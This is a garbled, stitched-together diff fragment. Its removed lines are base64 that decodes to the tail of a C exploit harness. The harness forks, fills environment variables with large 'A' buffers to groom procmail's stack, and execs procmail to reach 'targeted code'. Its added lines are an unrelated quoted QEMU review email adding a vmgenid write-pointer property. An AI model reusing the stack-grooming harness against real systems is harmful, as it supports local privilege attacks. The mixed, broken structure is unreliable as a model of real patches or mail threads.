-IHdlIHdhbnQgdG8ga2VlcCB0aGUKCS8vIHByb2NtYWlsIHBhZ2VzIHBpbm5lZC4KCWNoaWxkID0g
-Zm9yaygpOwoJaWYgKGNoaWxkID09IC0xKQoJCWVycigxLCAiZm9yayIpOwoJaWYgKGNoaWxkID09
-IDApIHsKCQkvLyBwcm9jbWFpbCByZWFjaGVzIHRoZSB0YXJnZXRlZCBjb2RlIGFmdGVyIEVPRiBv
-biBzdGRpbgoJCWNsb3NlKDApOwoJCWlmIChvcGVuKCIvZGV2L251bGwiLCBPX1JET05MWSkgIT0g
-MCkKCQkJZXJyKDEsICJvcGVuIC9kZXYvbnVsbCIpOwoJCS8vIHRvIG1ha2Ugcm9vbSBvbiBwcm9j
-bWFpbCdzIHN0YWNrCgkJY2hhciBnYXJiYWdlWzB4MTAwMDBdOwoJCW1lbXNldChnYXJiYWdlLCAn
-QScsIHNpemVvZihnYXJiYWdlKS0xKTsKCQlnYXJiYWdlW3NpemVvZihnYXJiYWdlKS0xXSA9IDA7
-CgkJc2V0ZW52KCJEVU1NWTEiLCBnYXJiYWdlLCAxKTsKCQlzZXRlbnYoIkRVTU1ZMiIsIGdhcmJh
-Z2UsIDEpOwoJCXNldGVudigiRFVNTVkzIiwgZ2FyYmFnZSwgMSk7CgkJZXhlY2xwKCJwcm9jbWFp
-bCIsICJwcm9jbWFpbCIsIE5VTEwpOwoJCWVycigxLCAiZXhlY2xwIik7Cgl9CglpZiAod2FpdCgm
-c3RhdHVzKSAhPSBjaGlsZCkKCQllcnIoMSwgInVuYWJsZSB0byB3YWl0IGZvciBjaGlsZCIpOwoJ
-cHV0cygicHJvY21haWwgdGVybWluYXRlZCwgcXVpdHRpbmciKTsKCXJldHVybiAwOwp9CgAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
---001a114ac834fbdd6d054b2a75f2--
+>> ---
+>>  include/hw/acpi/vmgenid.h |  1 +
+>>  include/hw/compat.h       |  4 ++++
+>>  hw/acpi/vmgenid.c         | 14 ++++++++++++++
+>>  3 files changed, 19 insertions(+)
+>>
+>> diff --git a/include/hw/acpi/vmgenid.h b/include/hw/acpi/vmgenid.h
+>> index db7fa0e63303..8578476baebe 100644
+>> --- a/include/hw/acpi/vmgenid.h
+>> +++ b/include/hw/acpi/vmgenid.h
+>> @@ -21,6 +21,7 @@ typedef struct VmGenIdState {
+>>      DeviceClass parent_obj;
+>>      QemuUUID guid;                /* The 128-bit GUID seen by the guest */
+>>      uint8_t vmgenid_addr_le[8];   /* Address of the GUID (little-endian) */
+>> +    bool write_pointer_available;
+>>  } VmGenIdState;
+>>  
+>>  static inline Object *find_vmgenid_dev(void)
+>> diff --git a/include/hw/compat.h b/include/hw/compat.h
+>> index fc8c3e060007..c9caa8cd1bdd 100644
+>> --- a/include/hw/compat.h
+>> +++ b/include/hw/compat.h
+>> @@ -42,6 +42,10 @@
+>>          .driver   = "isa-cirrus-vga",\
+>>          .property = "vgamem_mb",\
+>>          .value    = "8",\
+>> +    },{\
+>> +        .driver   = "vmgenid",\
+>> +        .property = "x-write-pointer-available",\
+>> +        .value    = "off",\
+>>      },
+>>  
+>>  #define HW_COMPAT_2_7 \
+>> diff --git a/hw/acpi/vmgenid.c b/hw/acpi/vmgenid.c
+>> index 7a3ad17d66ef..c3ddcc8e7cb0 100644
+>> --- a/hw/acpi/vmgenid.c
+>> +++ b/hw/acpi/vmgenid.c
+>> @@ -205,9 +205,22 @@ static void vmgenid_handle_reset(void *opaque)
+>>      memset(vms->vmgenid_addr_le, 0, ARRAY_SIZE(vms->vmgenid_addr_le));
+>>  }
+>>  
+>> +static Property vmgenid_properties[] = {
+>> +    DEFINE_PROP_BOOL("x-write-pointer-available", VmGenIdState,
+>> +                     write_pointer_available, true),
+>> +    DEFINE_PROP_END_OF_LIST(),
+>> +};
+>> +
+>>  static void vmgenid_realize(DeviceState *dev, Error **errp)
+>>  {
+>>      VmGenIdState *vms = VMGENID(dev);
+>> +
+>> +    if (!vms->write_pointer_available) {
+>> +        error_setg(errp, "%s requires DMA write support in fw_cfg, "
+>> +                   "which this machine type does not provide", VMGENID_DEVICE);
+>> +        return;
+>> +    }
+>> +
+>>      qemu_register_reset(vmgenid_handle_reset, vms);
+>>  }
+>>  
+>> @@ -218,6 +231,7 @@ static void vmgenid_device_class_init(ObjectClass *klass, void *data)
+>>      dc->vmsd = &vmstate_vmgenid;
+>>      dc->realize = vmgenid_realize;
+>>      dc->hotpluggable = false;
+>> +    dc->props = vmgenid_properties;
+>>  
+>>      object_class_property_add_str(klass, VMGENID_GUID, NULL,
+>>                                    vmgenid_set_guid, NULL);
+>> -- 
+>> 2.9.3
+>>
+> 
